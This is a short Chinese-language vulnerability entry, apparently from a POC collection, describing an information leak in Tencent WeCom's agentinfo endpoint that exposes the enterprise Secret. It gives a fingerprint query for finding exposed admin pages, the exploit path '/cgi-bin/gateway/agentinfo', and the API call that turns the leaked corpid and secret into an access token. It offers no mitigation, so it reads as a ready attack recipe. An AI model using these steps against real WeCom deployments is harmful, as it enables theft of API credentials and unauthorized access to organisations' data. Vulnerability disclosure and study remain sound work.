# 腾讯 企业微信 agentinfo 信息泄漏漏洞

## 漏洞描述

腾讯 企业微信 agentinfo 接口存在信息泄漏漏洞，攻击者通过漏洞可以获取企业微信 Secret

## 漏洞影响

腾讯 企业微信

## 网络测绘

```
web.body="wework_admin.normal_layout"
```

## 漏洞复现

登陆页面

![image-20230828145521417](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326121641929.png)

验证POC

```
/cgi-bin/gateway/agentinfo
```

![image-20230828145533569](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326121641930.png)

获取Token

```
https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid=<YOUR_CORPID>&corpsecret=<YOUR_CORPSECRET>
```

